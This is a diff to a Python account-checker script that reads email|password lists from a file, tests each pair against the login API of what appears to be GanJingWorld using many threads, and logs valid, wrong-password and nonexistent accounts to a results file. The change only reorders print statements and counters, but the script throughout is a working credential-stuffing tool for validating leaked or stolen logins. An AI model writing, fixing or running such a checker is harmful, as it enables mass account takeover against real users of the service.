@@ -496,8 +496,8 @@ def check_acc(account, total):
             continue
     if "The user does not exist" in a.text:
         open("Result_check_acc.txt", "a", encoding="utf-8").write(f"{email}|{password}|Email doesnt exist\n")
-        print(f"\033[91m[Good: {good} Bad: {bad} | Total: {total}]{email}|{password}|Email doesnt exist") 
         bad += 1
+        print(f"\033[91m[Good: {good} Bad: {bad} | Total: {total}]{email}|{password}|Email doesnt exist") 
         return
     server_salt = a.json()["data"]["server_salt"]
     client_salt = a.json()["data"]["client_salt"]
@@ -540,9 +540,8 @@ def check_acc(account, total):
                 bad += 1
                 print(f"\033[91m[Good: {good} Bad: {bad} | Total: {total}]{email}|{password}|Wrong password")
                 return
-            user_id = a.json()["data"]["user_id"]
-            print(f"\033[92m[Good: {good} Bad: {bad} | Total: {total}]{email}|{password}|Login success")
             good += 1
+            print(f"\033[92m[Good: {good} Bad: {bad} | Total: {total}]{email}|{password}|Login success")
             while True:
                 try:
                     h = {
@@ -676,12 +675,12 @@ def menu():
             data = input("Enter to import account Ganjingworld")
             data = filedialog.askopenfilename(title="Select file data", filetypes=(("Text files", "*.txt"), ("all files", "*.*")))
             data = open(data, encoding="utf-8", errors="replace").readlines()
-            print(f"Import {len(data_acc)} account")
             data_acc = []
             for i in data:
                 i = i.strip("\n")
                 if (len(i.split("|")) >= 2) and (("@" in i.split("|")[0]) == True) and (i.split("|")[1] != "") and (i.split("|")[0] != ""):
                     data_acc.append(i)
+            print(f"Import {len(data_acc)} account")
             luong = int(input("Nhập số luồng: "))
             for i in range(0, len(data_acc), luong):
                 aaa = data_acc[i:i+luong]
